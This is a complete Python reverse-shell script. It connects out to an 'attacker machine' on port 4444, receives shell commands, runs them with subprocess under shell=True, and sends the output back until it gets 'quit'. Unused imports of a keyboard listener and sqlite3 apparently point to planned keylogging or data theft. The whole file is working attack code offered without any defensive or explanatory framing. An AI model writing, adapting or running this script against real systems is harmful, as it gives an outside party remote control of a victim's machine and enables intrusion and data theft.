#!/usr/bin/python
# imports here
#from pynput import keyboard
import os
import socket,subprocess
from os import getenv
import sqlite3


HOST = ''    # The remote host
PORT = 4444            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send(b'[*] Connection Established!')
# start loop

def Main():
    while 1:
        # recieve shell command
        data = s.recv(4096).decode('utf-8')
        # if its quit, then break out and close socket
        if data == "quit": break
        try:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            print (e.output)
            Main()
        #  read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send output to attacker
        s.send(stdout_value)
        # close socket
    s.close()

if __name__ == "__main__": Main()
